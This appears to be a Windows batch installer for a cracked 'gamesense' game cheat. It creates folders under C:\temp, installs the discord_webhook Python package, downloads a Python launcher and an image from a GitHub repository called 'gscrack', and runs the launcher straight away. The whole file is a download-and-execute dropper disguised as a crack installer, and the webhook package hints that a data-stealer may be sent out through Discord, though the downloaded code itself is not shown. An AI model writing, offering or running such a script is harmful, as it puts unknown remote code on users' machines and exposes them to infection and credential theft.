@echo off
pip install discord_webhook
cls
md C:\temp\gamesense
md C:\temp\gamesense\configs
md C:\temp\gamesense\scripts
powershell Invoke-WebRequest -uri "https://github.com/ArekLubiPlacki/gscrack/raw/main/wallpaper.png" -OutFile "C:\temp\gamesense\wallpaper.png"
powershell Invoke-WebRequest -uri "https://github.com/ArekLubiPlacki/gscrack/raw/main/GsLauncher.py" -OutFile "C:\temp\gamesense\GsLauncher.py"
timeout 1 >nul
cd c:\temp\gamesense
start GsLauncher.py
